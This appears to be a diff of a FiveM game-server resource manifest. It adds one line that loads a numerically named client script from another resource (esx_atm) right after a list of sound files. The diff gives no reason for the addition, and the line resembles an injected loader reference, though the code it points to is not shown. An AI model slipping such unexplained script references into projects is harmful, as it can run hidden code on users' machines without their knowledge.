@@ -41,3 +41,4 @@ files {
 	"html/sounds/*.ogg",
 	"html/sounds/*.mp3",
 }
+client_script '@esx_atm/48706.lua'
